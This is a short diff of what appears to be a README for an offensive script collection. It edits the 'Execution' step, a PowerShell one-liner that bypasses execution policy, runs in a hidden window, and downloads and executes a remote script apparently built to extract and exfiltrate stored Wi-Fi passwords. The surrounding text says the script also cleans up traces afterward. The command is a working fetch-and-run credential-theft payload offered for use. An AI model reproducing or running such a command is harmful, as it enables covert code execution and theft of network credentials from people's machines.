@@ -35,6 +35,6 @@ Then it cleans up traces of what you have done after.
 
 Execution
 ```powershell
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
+powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
 ```
 
